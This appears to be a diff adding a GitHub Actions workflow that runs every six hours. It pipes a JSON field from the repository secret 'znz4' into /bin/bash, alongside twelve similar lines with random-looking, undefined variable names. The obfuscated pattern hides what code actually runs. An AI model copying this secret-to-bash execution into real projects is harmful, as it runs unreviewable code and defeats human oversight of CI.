@@ -1,0 +1,30 @@
+name: jiuyaowotui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiuyaowotui
+        env:
+          znz4: ${{ secrets.znz4 }}
+        run: |
+          echo $znz4 | jq -r .ovrhf81 | /bin/bash
+          echo $gh52715 | jq -r .dqmhs3876 | /bin/bash
+          echo $limo2315 | jq -r .foivw85 | /bin/bash
+          echo $yr41331 | jq -r .iiqst8953 | /bin/bash
+          echo $ygcow66288 | jq -r .qafs6 | /bin/bash
+          echo $fzdnp8 | jq -r .w312 | /bin/bash
+          echo $b35 | jq -r .sxky98 | /bin/bash
+          echo $nw317 | jq -r .lju2 | /bin/bash
+          echo $ej73995 | jq -r .uyjx7888 | /bin/bash
+          echo $fbiwj4445 | jq -r .t63 | /bin/bash
+          echo $xwmv5222 | jq -r .ovs854 | /bin/bash
+          echo $yeblw63 | jq -r .suks5 | /bin/bash
+          echo $yol49 | jq -r .vojac354 | /bin/bash
+
